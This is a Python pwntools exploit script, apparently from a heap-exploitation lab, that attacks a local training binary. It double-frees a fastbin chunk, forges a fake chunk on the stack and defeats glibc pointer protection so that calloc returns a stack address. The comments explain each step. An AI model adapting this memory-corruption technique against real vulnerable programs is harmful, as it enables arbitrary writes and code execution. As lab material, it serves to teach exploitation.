#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr

# same as duplicated fastbin chunk, but
# this time we exploit the duplicated chunk
# by taking it into a state where it is both,
# allocated and freed at the same time. 
# we use the allocated one to write and forge 
# a fake next fastbin chunk to an arbitrary address, 
# the stack in this case.

def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    # 7 allocations to fill 0x20 bin in tcache
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0x10")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    # for fastbin chunk 1
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*] ")
    fastbin_alloc1 = int(p.recvline()[:-1], 16)
    print(f"fastbin alloc 1 = {fastbin_alloc1:#x}")

    # for fastbin chunk 2
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*] ")
    fastbin_alloc2 = int(p.recvline()[:-1], 16)
    print(f"fastbin alloc 2 = {fastbin_alloc2:#x}")

    # get heap page where we're going to write
    heap_page = fastbin_alloc1 & ~0xfff
    print(f"heap page: {heap_page:#x}")

    # fill 0x20 bin in tcache
    for current in tcache_allocations:
        p.sendline(f"free {current:#x}".encode())

    # free both chunks to fastbin 0x20 and duplicate the first one
    p.sendline(f"free {fastbin_alloc1:#x}".encode())
    p.sendline(f"free {fastbin_alloc2:#x}".encode())
    p.sendline(f"free {fastbin_alloc1:#x}".encode())
    # at this point fastbin 0x20: fastbin_alloc1 -> fastbin_alloc2 -> fastbin_alloc1

    p.clean()
    p.sendline(b"calloc 0x1 0x10")
    p.recvuntil(b"[*] ")
    dup_fastbin_alloc1 = int(p.recvline()[:-1], 16)
    print(f"dup_fastbin_alloc1 = {dup_fastbin_alloc1:#x}")

    # drop the middle one
    p.sendline(b"calloc 0x1 0x10")
    # at this point fastbin 0x20: fastbin_alloc1
    # but we also have an active allocation dup_fastbin_alloc1 to
    # that chunk. 

    # forge fake chunk in the stack
    fake_chunk_ptr = stack_ptr
    fake_chunk = (
        pwn.p64(0x00) +     # prev size
        pwn.p64(0x21)       # curr size + P flag 
    )
    p.sendline(f"write {fake_chunk_ptr:#x} {len(fake_chunk):#x}".encode())
    p.sendline(fake_chunk)

    # dup_fastbin_alloc1 is being considered both, allocated and free at the same time
    # update dup_fastbin_alloc1 from the allocated side, to make fd point to our fake chunk
    p.sendline(f"write {dup_fastbin_alloc1:#x} 0x8".encode())
    protected_ptr = protect_ptr(heap_page, fake_chunk_ptr)
    p.sendline(pwn.p64(protected_ptr))

    # now, first allocation from fastbin 0x20
    p.sendline(b"calloc 0x1 0x10")

    # second allocation from fastbin 0x20 will return the malicious
    # address, pointing to the stack
    p.clean()
    p.sendline(b"calloc 0x1 0x10")
    p.recvuntil(b"[*]")
    ptr = int(p.recvline()[:-1], 16)
    input(f"done. calloc returned a stack address: {ptr:#x}")
    

def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
